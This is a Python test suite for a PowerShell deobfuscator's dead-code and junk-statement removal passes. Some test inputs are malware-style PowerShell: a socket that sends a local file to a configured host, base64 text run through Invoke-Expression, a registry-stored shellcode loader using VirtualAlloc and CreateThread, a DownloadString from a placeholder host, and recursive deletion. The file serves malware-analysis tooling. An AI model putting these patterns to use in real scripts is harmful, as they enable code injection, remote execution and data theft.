from __future__ import annotations

from inspect import cleandoc

from test import wontfix, opportunity
from test.lib.scripts.ps1.deobfuscation import TestPs1

from refinery.lib.scripts.ps1.deobfuscation import (
    Ps1DeadStoreElimination,
    Ps1JunkStatementRemoval,
    Ps1UnusedVariableRemoval,
)
from refinery.lib.scripts.ps1.model import Ps1CommandInvocation
from refinery.lib.scripts.ps1.options import Ps1DeobfuscationOptions
from refinery.lib.scripts.ps1.parser import Ps1Parser
from refinery.lib.scripts.ps1.synth import Ps1Synthesizer


class TestPs1UnusedVariableRemoval(TestPs1):

    def test_unused_constant_assignment_removed(self):
        result = self._deobfuscate("$x = 'hello'; Write-Host done")
        self.assertNotIn('$x', result)
        self.assertNotIn('hello', result)
        self.assertIn('done', result)

    def test_multiple_unused_removed(self):
        result = self._deobfuscate("$a = 1; $b = 2; Write-Host done")
        self.assertNotIn('$a', result)
        self.assertNotIn('$b', result)
        self.assertIn('done', result)

    def test_used_variable_kept(self):
        result = self._deobfuscate("$x = 'hello'; Write-Host $x")
        self.assertIn('hello', result)

    def test_side_effect_rhs_preserved(self):
        result = self._deobfuscate("$x = Start-Process notepad; Write-Host done")
        self.assertNotIn('$x', result)
        self.assertIn('Start-Process', result)
        self.assertIn('done', result)

    def test_increment_removed(self):
        result = self._deobfuscate("$x = 0; $x++; Write-Host done")
        self.assertNotIn('$x', result)
        self.assertIn('done', result)

    def test_foreach_variable_preserved(self):
        result = self._deobfuscate(
            "foreach ($item in @(1,2,3)) { Write-Host 'hi' }")
        self.assertIn('foreach', result.lower())

    def test_scoped_variable_preserved(self):
        result = self._deobfuscate("$script:x = 42; Write-Host done")
        self.assertIn('$script:x', result)

    def test_an_unread_environment_store_is_stripped_as_declared_noise(self):
        self.assertEqual(
            self._apply("$env:Q = 'v'\nWrite-Host done", Ps1UnusedVariableRemoval),
            'Write-Host done')

    def test_an_environment_store_is_kept_under_the_preserving_model(self):
        source = "$env:Q = 'v'\nStart-Process notepad"
        ast = Ps1Parser(source).parse()
        transform = Ps1UnusedVariableRemoval()
        transform.options = Ps1DeobfuscationOptions(preserve_env_stores=True)
        transform.visit(ast)
        self.assertEqual(Ps1Synthesizer().convert(ast), source)

    def test_parameter_preserved(self):
        result = self._deobfuscate(
            "function Test { Param($x); Write-Host done }; Test")
        self.assertIn('$x', result)

    def test_a_script_reduced_to_this_passs_own_discards_is_left_alone(self):
        for source in (
            '$x = Start-Process calc',
            "$x = Start-Process calc\n$y = Remove-Item C:\\z",
        ):
            with self.subTest(source):
                self.assertEqual(self._apply(source, Ps1UnusedVariableRemoval), source)

    def test_compound_assignment_removed(self):
        result = self._deobfuscate("$x = 0; $x += 1; Write-Host done")
        self.assertNotIn('$x', result)
        self.assertIn('done', result)

    def test_self_referential_folded(self):
        result = self._deobfuscate("$x = 0; $x = $x + 1; Write-Host $x")
        self.assertNotIn('$x', result)
        self.assertIn('1', result)

    def test_a_store_a_callee_writes_through_a_reference_stays_while_the_call_does(self):
        source = "$n = 0\n[void][int]::TryParse('7', [ref]$n)\nWrite-Host done"
        self.assertIn(self._apply(source, Ps1UnusedVariableRemoval), (source, 'Write-Host done'))

    @opportunity
    def test_a_store_a_callee_writes_through_a_reference_goes_when_nothing_reads_it(self):
        self.assertEqual(
            self._deobfuscate("$n = 0\n[void][int]::TryParse('7', [ref]$n)\nWrite-Host done"),
            'Write-Host done',
        )


class TestPs1JunkStatementRemoval(TestPs1):

    def test_void_cast_removed(self):
        result = self._deobfuscate('[Void]([Math]::Sqrt(144)); Write-Host done')
        self.assertNotIn('Sqrt', result)
        self.assertIn('done', result)

    def test_void_cast_around_a_call_preserved(self):
        result = self._deobfuscate('[Void](Start-Process notepad); Write-Host done')
        self.assertIn('Start-Process', result)
        self.assertIn('done', result)

    def test_void_cast_around_a_call_preserved_inside_a_function(self):
        result = self._deobfuscate(
            'function f { Write-Host hi; [Void](Remove-Item C:\\important) }\nf')
        self.assertIn('Remove-Item', result)

    def test_an_advanced_function_is_not_junk(self):
        result = self._deobfuscate(
            'function f { process { Start-Process notepad } }\nf\nWrite-Host done')
        self.assertIn('Start-Process', result)
        self.assertIn('function f', result)
        self.assertIn('done', result)

    def test_a_member_invoking_foreach_is_not_a_discard(self):
        result = self._deobfuscate(
            'Get-Process | ForEach-Object -MemberName Kill\nWrite-Host done')
        self.assertIn('Kill', result)
        self.assertIn('done', result)

    def test_a_member_invoking_foreach_is_not_excused_by_a_discarding_block(self):
        for source in (
            'Get-Process | ForEach-Object { [Void]$_ } -MemberName Kill\nWrite-Host done',
            'Get-Process | ForEach-Object { [Void]$_ } Kill\nWrite-Host done',
            'Get-Process | ForEach-Object { $Null = $_ } -MemberName Kill\nWrite-Host done',
        ):
            with self.subTest(source):
                result = self._deobfuscate(source)
                self.assertIn('Kill', result)
                self.assertIn('done', result)

    def test_a_member_named_by_a_here_string_is_still_a_member(self):
        for source in (
            "Get-ChildItem C:\\ | ForEach-Object { $Null = $_ } -MemberName @'\nDelete\n'@",
            "Get-Process | ForEach-Object { [Void]$_ } @'\nKill\n'@",
        ):
            with self.subTest(source):
                self.assertIn('ForEach-Object', self._deobfuscate(F'{source}\nWrite-Host done'))

    def test_a_foreach_body_hidden_in_a_named_or_param_block_is_kept(self):
        for source in (
            'Get-ChildItem C:\\ | ForEach-Object { end { Remove-Item C:\\important -Recurse } }',
            '1..3 | ForEach-Object { begin { Start-Process notepad } process { [Void]$_ } }',
            '1..3 | ForEach-Object -Process { param($p = (Start-Process notepad)) [Void]$_ }',
        ):
            with self.subTest(source):
                self.assertIn('ForEach-Object', self._deobfuscate(F'{source}\nWrite-Host done'))

    def test_a_computed_member_name_keeps_the_statement_that_computes_it(self):
        result = self._deobfuscate('if ($true) { $x.$(Start-Process notepad) }\nWrite-Host done')
        self.assertIn('Start-Process', result)
        self.assertIn('done', result)

    def test_a_hash_literal_key_that_runs_a_command_is_kept(self):
        result = self._deobfuscate('if ($true) { @{ $(Start-Process notepad) = 1 } }\nWrite-Host x')
        self.assertIn('Start-Process', result)

    def test_a_junk_function_stays_removable_when_it_declares_parameters(self):
        result = self._deobfuscate('function j($x) { $Null = 915 }\nj\nWrite-Host done')
        self.assertNotIn('function', result)
        self.assertIn('done', result)

    def test_a_foreach_block_held_in_a_variable_is_kept(self):
        for source in (
            'Param($sb)\n1..3 | ForEach-Object -Process { [Void]$_ } -End $sb\nWrite-Host done',
            '1..3 | ForEach-Object { [Void]$_ } $Global:sb\nWrite-Host done',
        ):
            with self.subTest(source):
                self.assertIn('ForEach-Object', self._deobfuscate(source))

    def test_a_parameter_default_that_runs_a_command_keeps_the_function(self):
        result = self._deobfuscate(
            'function f { param($x = (Start-Process notepad)) }\nf\nWrite-Host done')
        self.assertIn('Start-Process', result)
        self.assertIn('done', result)

    def test_a_splatted_argument_keeps_the_command(self):
        result = self._deobfuscate('Get-Date @options\nWrite-Host $d')
        self.assertIn('Get-Date', result)

    def test_a_discard_terminator_may_not_hide_a_call_in_its_arguments(self):
        result = self._deobfuscate(
            '1 | Out-Null -InputObject (Start-Process notepad)\nWrite-Host done')
        self.assertIn('Start-Process', result)
        self.assertIn('done', result)

    def test_a_redirected_command_is_kept(self):
        result = self._deobfuscate('Get-Date > C:\\out.txt\nWrite-Host done')
        self.assertIn('out.txt', result)
        self.assertIn('done', result)

    def test_an_out_parameter_call_is_kept(self):
        result = self._deobfuscate('[Int]::TryParse($s, [ref]$n)\nWrite-Host $n')
        self.assertIn('TryParse', result)

    def test_a_temporary_file_creation_is_kept(self):
        result = self._deobfuscate('[IO.Path]::GetTempFileName()\nWrite-Host done')
        self.assertIn('GetTempFileName', result)
        self.assertIn('done', result)

    def test_an_array_mutation_on_a_live_variable_is_kept(self):
        result = self._deobfuscate('[Array]::Reverse($buffer)\nWrite-Host done')
        self.assertIn('Reverse', result)
        self.assertIn('done', result)

    def test_a_command_that_fills_a_variable_is_kept(self):
        for source, marker in (
            ('Get-Date -OutVariable d\nWrite-Host $d', 'OutVariable'),
            ('Get-Date -OutVar d\nWrite-Host $d', 'OutVariable'),
            ('Get-Date -ov d\nWrite-Host $d', 'OutVariable'),
            ('Get-ChildItem -ErrorVariable e\nWrite-Host $e', 'ErrorVariable'),
            ('Get-Date | Out-Null -ErrorVariable e\nWrite-Host $e', 'ErrorVariable'),
            ('Get-Random -SetSeed 5\nWrite-Host done', 'SetSeed'),
        ):
            with self.subTest(source):
                self.assertIn(marker, self._deobfuscate(source))

    def test_a_constructor_argument_that_runs_a_command_is_kept(self):
        result = self._deobfuscate(
            "New-Object String 'x' (Start-Process notepad)\nWrite-Host done")
        self.assertIn('Start-Process', result)
        self.assertIn('done', result)

    def test_out_null_pipeline_removed(self):
        result = self._deobfuscate('[Math]::Pow(2, 8) | Out-Null; Write-Host done')
        self.assertNotIn('Pow', result)
        self.assertIn('done', result)

    def test_a_pure_statement_that_writes_to_the_output_stream_is_kept_with_stdout(self):
        for source, marker in (
            ('[Math]::Sqrt(36); Write-Host done'               , '6'),           # noqa
            ('Get-Random -Minimum 1 -Maximum 100; Write-Host done', 'Get-Random'),  # noqa
            ('(Get-Date).ToString("yyyy"); Write-Host done'    , 'ToString'),    # noqa
            ('Get-Date | Out-String; Write-Host done'          , 'Get-Date'),    # noqa
        ):
            with self.subTest(source):
                result = self._deobfuscate(source, preserve_bare_output=True)
                self.assertIn(marker, result)
                self.assertIn('done', result)

    def test_a_pure_statement_that_cannot_fail_and_only_prints_goes_without_stdout(self):
        self.assertEqual(self._deobfuscate('[Math]::Sqrt(36); Write-Host done'), 'Write-Host done')

    def test_side_effect_command_preserved(self):
        result = self._deobfuscate('Start-Sleep -s 1; Write-Host done')
        self.assertIn('Start-Sleep', result)
        self.assertIn('done', result)

    def test_uncalled_function_removed(self):
        result = self._deobfuscate(
            'function Junk { Get-Random }; Write-Host done')
        self.assertNotIn('Junk', result)
        self.assertIn('done', result)

    def test_called_function_preserved(self):
        result = self._deobfuscate(
            'function Helper { Write-Host $args[0] }; Helper; Write-Host done')
        self.assertIn('Helper', result)

    def test_an_expandable_string_that_only_prints_is_stripped(self):
        result = self._deobfuscate('"noise ${x} text"; Write-Host done')
        self.assertNotIn('noise', result)
        self.assertIn('done', result)

    def test_a_script_of_one_pure_value_keeps_printing_it(self):
        result = self._deobfuscate('[Math]::Sqrt(36)')
        self.assertIn('6', result)

    def test_nested_body_junk_removed(self):
        result = self._deobfuscate(
            'while ($True) { [Void]"noise"; Write-Host running; break }')
        self.assertNotIn('noise', result)
        self.assertIn('running', result)

    def test_subexpression_body_preserved(self):
        result = self._deobfuscate("$x = $($a.Name + '.' + $a.Extension)")
        self.assertIn('.Name', result)
        self.assertIn('.Extension', result)

    def test_scriptblock_body_preserved(self):
        result = self._deobfuscate('1,2,3 | ForEach-Object { $_.ToString() }')
        self.assertIn('.ToString()', result)

    def test_transitive_function_calls_preserved(self):
        result = self._deobfuscate(
            'function Inner { Get-Date }\n'
            'function Outer { Inner }\n'
            'Outer\n'
        )
        self.assertIn('Inner', result)
        self.assertIn('Get-Date', result)


class TestPs1UnusedExtra(TestPs1):

    def test_junk_removal_keeps_indirectly_called_function(self):
        result = self._apply(
            "function Invoke-Payload { Write-Host 'x' }\n& $f", Ps1JunkStatementRemoval)
        self.assertIn('Invoke-Payload', result)

    def test_junk_removal_keeps_collection_mutation(self):
        result = self._apply(
            "$list = [System.Collections.ArrayList]@(1, 2, 3)\n$list.Remove(2)",
            Ps1JunkStatementRemoval)
        self.assertIn('.Remove(2)', result)

    def test_unused_variable_read_in_function_is_kept(self):
        result = self._apply(
            "$x = 'payload'; function Run { iex $x }; Run", Ps1UnusedVariableRemoval)
        self.assertEqual(result, cleandoc("""
            $x = 'payload'
            function Run {
              iex $x
            }
            Run
        """))

    def test_unused_variable_scoped_read_is_kept(self):
        result = self._apply(
            "$x = 'keepme'; function f { Write-Host $script:x }; f", Ps1UnusedVariableRemoval)
        self.assertEqual(result, cleandoc("""
            $x = 'keepme'
            function f {
              Write-Host $script:x
            }
            f
        """))

    def test_dead_multiassign_all_targets_removed(self):
        result = self._apply(
            "$a, $b, $c = 1, 2, 3\nWrite-Host 'keep'", Ps1UnusedVariableRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_live_multiassign_cotarget_keeps_statement(self):
        result = self._apply(
            '$a, $b = 1, 2\nWrite-Output $b', Ps1UnusedVariableRemoval)
        self.assertEqual(result, '$a, $b = 1, 2\nWrite-Output $b')

    def test_pure_new_object_dead_store_removed(self):
        result = self._apply(
            "$x = New-Object System.Object\nWrite-Host 'keep'", Ps1UnusedVariableRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_impure_new_object_store_kept(self):
        result = self._apply(
            "$x = New-Object System.Net.WebClient\nWrite-Host 'keep'", Ps1UnusedVariableRemoval)
        self.assertEqual(result, "$Null = New-Object System.Net.WebClient\nWrite-Host 'keep'")

    def test_dropping_a_dead_store_does_not_start_emitting_its_value(self):
        for source in (
            "$unused = [Loader]'payload'",
            '$unused = New-Object System.Net.WebClient',
        ):
            with self.subTest(source):
                result = self._apply(
                    F"{source}\nWrite-Host 'keep'", Ps1UnusedVariableRemoval)
                self.assertTrue(result.startswith('$Null = '), result)

    def test_null_discard_pure_removed(self):
        result = self._apply(
            "$null = [Environment]::UserName\nWrite-Host 'keep'", Ps1JunkStatementRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_null_discard_side_effect_kept(self):
        result = self._apply(
            "$null = Remove-Item C:\\x\nWrite-Host 'keep'", Ps1JunkStatementRemoval)
        self.assertEqual(result, "$null = Remove-Item C:\\x\nWrite-Host 'keep'")


class TestPs1InertFunctionRemoval(TestPs1):

    def test_inert_function_and_call_removed(self):
        result = self._apply(
            "function j { $Null = 915 }\nj\nWrite-Host 'keep'", Ps1JunkStatementRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_inert_function_multiple_calls_removed(self):
        result = self._apply(
            "function j { $Null = 915 }\nj\nj\nj\nWrite-Host 'keep'", Ps1JunkStatementRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_a_function_that_only_prints_a_value_that_cannot_fail_goes(self):
        result = self._apply(
            "function f { Get-Random }\nf\nWrite-Host 'keep'", Ps1JunkStatementRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_emitting_function_kept_with_stdout(self):
        result = self._deobfuscate(
            "function f { Get-Random }\nf\nWrite-Host 'keep'", preserve_bare_output=True)
        self.assertEqual(result, "function f {\n  Get-Random\n}\nf\nWrite-Host 'keep'")

    def test_effectful_function_kept(self):
        result = self._apply(
            "function f { Write-Host 'real' }\nf", Ps1JunkStatementRemoval)
        self.assertEqual(result, "function f {\n  Write-Host 'real'\n}\nf")

    @opportunity
    def test_dynamic_dispatch_keeps_an_inert_function_but_not_a_call_that_ran_before_it(self):
        result = self._apply(
            "function j { $Null = 1 }\nj\n& $name\nWrite-Host 'keep'",
            Ps1JunkStatementRemoval)
        self.assertEqual(result, "function j {}\n& $name\nWrite-Host 'keep'")

    def test_a_call_to_an_inert_function_that_opens_a_file_is_kept(self):
        for redirection in (r'> C:\out.txt', r'>> C:\out.txt', r'2> C:\err.txt', r'3>> C:\v.txt'):
            with self.subTest(redirection):
                source = F"function j {{ $Null = 1 }}\nj {redirection}\nWrite-Host 'keep'"
                self.assertEqual(
                    self._apply(source, Ps1JunkStatementRemoval),
                    F"function j {{}}\nj {redirection}\nWrite-Host 'keep'")

    def test_a_call_to_an_inert_function_that_only_merges_streams_is_removed(self):
        self.assertEqual(
            self._apply(
                "function j { $Null = 1 }\nj 2>&1\nWrite-Host 'keep'", Ps1JunkStatementRemoval),
            "Write-Host 'keep'")

    @opportunity
    def test_an_inert_function_called_with_a_constant_argument_goes_with_its_call(self):
        result = self._apply(
            "function j { $Null = 1 }\nj 'arg'\nWrite-Host 'keep'", Ps1JunkStatementRemoval)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_function_captured_result_kept(self):
        result = self._apply(
            "function j { $Null = 1 }\n$x = j\nWrite-Host 'keep'", Ps1JunkStatementRemoval)
        self.assertEqual(result, "function j {}\n$x = j\nWrite-Host 'keep'")

    def test_a_scope_qualified_definition_is_reached_by_an_unqualified_call(self):
        for definition in ('global:f', 'script:f', 'local:f', 'private:f'):
            with self.subTest(definition):
                result = self._apply(
                    F"function {definition} {{ Start-Process calc }}\nf\nWrite-Host 'keep'",
                    Ps1JunkStatementRemoval)
                self.assertIn('Start-Process', result)

    def test_a_script_of_nothing_but_definitions_is_not_emptied(self):
        for script in ('function f { }', 'function f { }\nfunction g { }'):
            with self.subTest(script):
                result = self._apply(script, Ps1JunkStatementRemoval)
                self.assertIn('function f', result)

    def test_a_script_that_calls_its_own_inert_functions_is_still_emptied(self):
        for script in (
            'function j { $Null = 1 }\nj',
            'function f { $Null = 1 }\nfunction g { $Null = 2 }\nf\ng',
        ):
            with self.subTest(script):
                result = self._apply(script, Ps1JunkStatementRemoval)
                self.assertEqual(result.strip(), '')

    def test_param_block_function_module_preserved(self):
        result = self._apply(cleandoc("""
            function Ge {
              [CmdletBinding()]
              param (
                [parameter(ValueFromPipeline=$true)]
                $frk=$env:ComputerName
              )
              Write-Host $frk
            }
        """), Ps1JunkStatementRemoval)
        self.assertIn('function Ge', result)
        self.assertIn('Write-Host', result)


_ANCHOR = "Write-Host 'ANCHOR'"

_STRIPPABLE = {
    'string literal'   : ("'Xtjbnwqm'"           , 'Xtjbnwqm'),    # noqa
    'integer'          : ('4242424242'           , '4242424242'),  # noqa
    'negated integer'  : ('(-7654321)'           , '7654321'),     # noqa
    'real'             : ('3.14159265'           , '3.14159265'),  # noqa
    'boolean'          : ('$True'                , '$True'),       # noqa
    'string sum'       : ("'Xtjb' + 'nwqm'"      , 'Xtjb'),        # noqa
    'comparison'       : ('4242424242 -GT 3'     , '$True'),       # noqa
    'array literal'    : ('@(4242424242, 8484)'  , '4242424242'),  # noqa
    'hash literal'     : ("@{ a = 'Xtjbnwqm' }"  , 'Xtjbnwqm'),    # noqa
    'range'            : ('7654321..7654325'     , '7654321'),     # noqa
}


class TestPs1BareOutputIsStrippedByDefault(TestPs1):

    def _assertStripped(self, junk: str, marker: str) -> None:
        result = self._deobfuscate(F'{junk}\n{_ANCHOR}')
        self.assertNotIn(marker, result)
        self.assertIn('ANCHOR', result)

    def test_a_bare_literal_at_the_root_is_stripped(self):
        for kind in ('string literal', 'integer', 'negated integer', 'real', 'boolean'):
            with self.subTest(kind):
                self._assertStripped(*_STRIPPABLE[kind])

    def test_an_expression_that_folds_to_a_literal_is_stripped(self):
        for kind in ('string sum', 'comparison'):
            with self.subTest(kind):
                junk, _ = _STRIPPABLE[kind]
                self.assertEqual(self._deobfuscate(F'{junk}\n{_ANCHOR}'), _ANCHOR)

    def test_a_container_built_only_out_of_literals_is_stripped(self):
        for kind in ('array literal', 'hash literal', 'range'):
            with self.subTest(kind):
                self._assertStripped(*_STRIPPABLE[kind])

    def test_a_failing_cast_or_division_nothing_handles_is_stripped(self):
        for junk, marker in (("[Int]'Xtjbnwqm'", 'Xtjbnwqm'), ('4242424242 / $zero', '/')):
            with self.subTest(junk):
                self._assertStripped(junk, marker)

    def test_a_range_whose_bounds_fail_to_convert_is_stripped(self):
        for junk, marker in (
            ('4242424242..4242424245', '4242424242'),
            ('1..2147483648', '2147483648'),
        ):
            with self.subTest(junk):
                self._assertStripped(junk, marker)

    def test_a_range_the_operator_cannot_build_is_not_expanded_where_output_is_kept(self):
        for junk in ('4242424242..4242424245', '1..2147483648', '0..2147483647'):
            with self.subTest(junk):
                result = self._deobfuscate(F'{junk}\n{_ANCHOR}', preserve_bare_output=True)
                self.assertEqual(result, F'{junk}\n{_ANCHOR}')

    @wontfix('no obfuscator writes a dynamicparam block')
    def test_the_dictionary_a_dynamicparam_block_hands_back_is_kept(self):
        result = self._deobfuscate(cleandoc("""
            function f {
              [CmdletBinding()]
              param()
              dynamicparam {
                $d = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
                $d
              }
              end {
                Write-Host 'x'
              }
            }
            f
        """))
        self.assertIn('RuntimeDefinedParameterDictionary', result)
        self.assertRegex(result, r'(?m)^\s*\$d\s*$')

    def test_a_bare_value_in_a_function_every_call_site_only_prints_is_stripped(self):
        result = self._deobfuscate(F"function Qzmr {{ 'Xtjbnwqm' }}\nQzmr\n{_ANCHOR}")
        self.assertNotIn('Xtjbnwqm', result)
        self.assertIn('ANCHOR', result)


class TestPs1TheLastBareOutputSurvivesADeadSiblingAnotherPassRemoves(TestPs1):

    def test_a_dead_if_above_a_bare_literal_does_not_carry_the_literal_away(self):
        self.assertEqual(self._deobfuscate("if ($c) { 1 }; 'z'"), "'z'")

    def test_a_literal_false_if_above_a_bare_literal_keeps_the_literal(self):
        self.assertEqual(self._deobfuscate("if (0) { 1 }; 'z'"), "'z'")

    def test_a_dead_if_with_a_live_else_keeps_the_branch_output_and_the_literal(self):
        self.assertEqual(self._deobfuscate("if ($c) { 1 } else { 2 }; 'z'"), "2\n'z'")

    def test_an_empty_loop_above_a_bare_literal_does_not_carry_the_literal_away(self):
        self.assertEqual(self._deobfuscate("while ($c) { }; 'z'"), "'z'")


class TestPs1AReadThatConsumesWhatItReadsIsNotBareOutput(TestPs1):

    def _assertBareStatementSurvives(self, statement: str, survives: bool) -> None:
        body = F"""
            function Qzmr {{
              {statement}
              $Input | ForEach-Object {{ Write-Host "seen:$_" }}
            }}
            1, 2 | Qzmr
        """
        self._assertDeobfuscatesTo(body, body if survives else """
            function Qzmr {
              $Input | ForEach-Object { Write-Host "seen:$_" }
            }
            1, 2 | Qzmr
        """)

    def test_a_bare_read_of_the_enumerator_is_kept(self):
        self._assertBareStatementSurvives('$Input', survives=True)

    def test_a_bare_literal_beside_it_is_still_stripped(self):
        self._assertBareStatementSurvives("'Xtjbnwqm'", survives=False)


class TestPs1StrippingBareOutputDoesNotAlsoStripWhatProducedIt(TestPs1):

    def test_a_download_whose_value_is_only_echoed_survives_as_a_discard(self):
        self._assertDeobfuscatesTo(F"""
            $q = (New-Object Net.WebClient).DownloadString('http://zzq/a')
            $q
            {_ANCHOR}
        """, F"""
            $Null = (New-Object Net.WebClient).DownloadString('http://zzq/a')
            {_ANCHOR}
        """)


class TestPs1ASystemReadIsJunkUnlessItsDataFlowsIntoACall(TestPs1):

    def _assertTheReadsStay(self, source: str, *reads: str) -> None:
        for trust_eval in (False, True):
            with self.subTest(trust_eval=trust_eval):
                output = self._deobfuscate(cleandoc(source), trust_eval=trust_eval)
                commands = [
                    Ps1Synthesizer().convert(node)
                    for node in Ps1Parser(output).parse().walk()
                    if isinstance(node, Ps1CommandInvocation)
                ]
                for read in reads:
                    self.assertIn(self._apply(read), commands)

    def test_an_unused_file_read_goes(self):
        self._assertDeobfuscatesTo(F"""
            $Null = Get-Content zzq.txt
            {_ANCHOR}
        """, _ANCHOR)

    def test_a_file_read_whose_value_is_only_echoed_goes_with_the_echo(self):
        self._assertDeobfuscatesTo(F"""
            $q = Get-Content zzq.txt
            $q
            {_ANCHOR}
        """, _ANCHOR)

    def test_an_unused_registry_read_stored_in_a_variable_is_kept_discarded_or_removed(self):
        source = F"""
            $q = Get-ItemProperty 'HKCU:\\Software\\Zzq'
            {_ANCHOR}
        """
        discarded = F"""
            $Null = Get-ItemProperty 'HKCU:\\Software\\Zzq'
            {_ANCHOR}
        """
        self._assertDeobfuscatesToOneOf(source, source, discarded, _ANCHOR)

    @opportunity
    def test_an_unused_registry_read_stored_in_a_variable_goes(self):
        self._assertDeobfuscatesTo(F"""
            $q = Get-ItemProperty 'HKCU:\\Software\\Zzq'
            {_ANCHOR}
        """, _ANCHOR)

    def test_a_config_read_whose_host_and_port_open_a_socket_stays_with_the_file_it_sends(self):
        self._assertTheReadsStay(
            r"""
            $config = Get-Content 'C:\ProgramData\Zzq\config.json' -Raw | ConvertFrom-Json
            $client = New-Object Net.Sockets.TcpClient($config.host, $config.port)
            $stream = $client.GetStream()
            $data = Get-Content 'C:\Users\Public\zzq.dat' -Encoding Byte -ReadCount 0
            $stream.Write($data, 0, $data.Length)
            $client.Close()
            """,
            r"Get-Content 'C:\ProgramData\Zzq\config.json' -Raw",
            r"Get-Content 'C:\Users\Public\zzq.dat' -Encoding Byte -ReadCount 0",
        )

    def test_a_file_read_whose_decoded_text_is_run_stays(self):
        self._assertTheReadsStay(
            r"""
            $encoded = Get-Content 'C:\Users\Public\zzq.txt' -Raw
            $text = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
            Invoke-Expression $text
            """,
            r"Get-Content 'C:\Users\Public\zzq.txt' -Raw",
        )

    def test_registry_reads_whose_bytes_start_a_thread_stay(self):
        self._assertTheReadsStay(
            r"""
            $a = (Get-ItemProperty 'HKCU:\Software\Zzq' -Name a).a
            $b = (Get-ItemProperty 'HKCU:\Software\Zzq' -Name b).b
            $c = (Get-ItemProperty 'HKCU:\Software\Zzq' -Name c).c
            $code = [Convert]::FromBase64String($a + $b + $c)
            Add-Type -TypeDefinition @'
            using System;
            using System.Runtime.InteropServices;
            public static class Zzq {
                [DllImport("kernel32.dll")]
                public static extern IntPtr VirtualAlloc(IntPtr a, uint n, uint t, uint p);
                [DllImport("kernel32.dll")]
                public static extern IntPtr CreateThread(
                    IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);
            }
            '@
            $memory = [Zzq]::VirtualAlloc(0, $code.Length, 0x3000, 0x40)
            [Runtime.InteropServices.Marshal]::Copy($code, 0, $memory, $code.Length)
            $Null = [Zzq]::CreateThread(0, 0, $memory, 0, 0, 0)
            """,
            r"Get-ItemProperty 'HKCU:\Software\Zzq' -Name a",
            r"Get-ItemProperty 'HKCU:\Software\Zzq' -Name b",
            r"Get-ItemProperty 'HKCU:\Software\Zzq' -Name c",
        )


class TestPs1BareOutputIsKeptWhenAsked(TestPs1):

    def _assertTheBareValueIsKept(self, junk: str, marker: str) -> None:
        result = self._deobfuscate(F'{junk}\n{_ANCHOR}', preserve_bare_output=True)
        self.assertIn(marker, result)
        self.assertIn('ANCHOR', result)

    def test_a_bare_literal_at_the_root_is_kept(self):
        for kind in ('string literal', 'integer', 'negated integer', 'real', 'boolean'):
            with self.subTest(kind):
                self._assertTheBareValueIsKept(*_STRIPPABLE[kind])

    def test_a_folded_literal_is_kept(self):
        for kind in ('string sum', 'comparison'):
            with self.subTest(kind):
                self._assertTheBareValueIsKept(*_STRIPPABLE[kind])

    def test_a_container_built_only_out_of_literals_is_kept(self):
        for kind in ('array literal', 'hash literal', 'range'):
            with self.subTest(kind):
                self._assertTheBareValueIsKept(*_STRIPPABLE[kind])

    def test_a_bare_value_in_a_function_every_call_site_only_prints_is_kept(self):
        result = self._deobfuscate(
            F"function Qzmr {{ 'Xtjbnwqm' }}\nQzmr\n{_ANCHOR}", preserve_bare_output=True)
        self.assertIn('Xtjbnwqm', result)
        self.assertIn('ANCHOR', result)


class TestPs1OutputSomethingElseHoldsIsKeptEitherWay(TestPs1):

    _QZMR = "function Qzmr { Write-Host 'inner'; 'Xtjbnwqm' }\n"

    def _assertKeptEitherWay(self, source: str, marker: str) -> None:
        default = self._deobfuscate(source)
        preserved = self._deobfuscate(source, preserve_bare_output=True)
        self.assertEqual(default, preserved)
        self.assertIn(marker, default)

    def test_a_value_a_caller_stores_is_kept(self):
        for call in ('$r = Qzmr', '$r = @(Qzmr)', '$r = $(Qzmr)'):
            with self.subTest(call):
                self._assertKeptEitherWay(
                    F'{self._QZMR}{call}\nWrite-Host $r', 'Xtjbnwqm')

    def test_a_value_a_redirection_moves_elsewhere_is_kept(self):
        for call in (r'Qzmr > C:\out.txt', 'Qzmr 1>&2'):
            with self.subTest(call):
                self._assertKeptEitherWay(F'{self._QZMR}{call}\n{_ANCHOR}', 'Xtjbnwqm')

    def test_a_value_a_call_site_hands_to_anything_at_all_is_kept(self):
        for call in (
            r"[IO.File]::WriteAllText('C:\out.txt', (Qzmr))",
            r'Set-Content C:\out.txt (Qzmr)',
            'if (Qzmr) { Start-Process calc }',
            'while (Qzmr) { Start-Process calc }',
            'foreach ($i in Qzmr) { Start-Process $i }',
            'switch (Qzmr) { 1 { Start-Process calc } }',
            'Write-Host (Qzmr)',
            'throw (Qzmr)',
            '$a = @(1, 2)[(Qzmr)]',
        ):
            with self.subTest(call):
                self._assertKeptEitherWay(F'{self._QZMR}{call}\n{_ANCHOR}', 'Xtjbnwqm')

    def test_a_value_a_parameter_default_holds_is_kept(self):
        self._assertKeptEitherWay(
            F'{self._QZMR}function Ldkr {{ param($p = (Qzmr)) Write-Host $p }}\nLdkr\n{_ANCHOR}',
            'Xtjbnwqm')

    def test_a_value_a_pipeline_consumes_is_kept_though_nothing_could_tell(self):
        self._assertKeptEitherWay(F'{self._QZMR}Qzmr | Out-Null\n{_ANCHOR}', 'Xtjbnwqm')

    def test_a_fault_inside_a_function_a_handler_catches_is_kept(self):
        self._assertKeptEitherWay(
            "function Qzmr { [Int]'Xtjbnwqm' }\n"
            "try { Qzmr } catch { Write-Host 'CAUGHT' }", 'CAUGHT')

    @opportunity
    def test_a_function_another_defines_and_never_calls_goes_in_either_model(self):
        source = F"function Outer {{ function Inner {{ 'Xtjbnwqm' }} }}\nOuter\n{_ANCHOR}"
        self.assertEqual(self._deobfuscate(source), _ANCHOR)
        self.assertEqual(self._deobfuscate(source, preserve_bare_output=True), _ANCHOR)

    def test_one_captured_call_site_keeps_the_value_of_the_definition_it_reaches(self):
        source = (
            "function Qzmr { 'Xtjbnwqm' }\n"
            "function Qzmr { 'Ldkrpwsz' }\n"
            F"Qzmr\n$r = Qzmr\nWrite-Host $r\n{_ANCHOR}"
        )
        self.assertIn('Ldkrpwsz', self._deobfuscate(source))
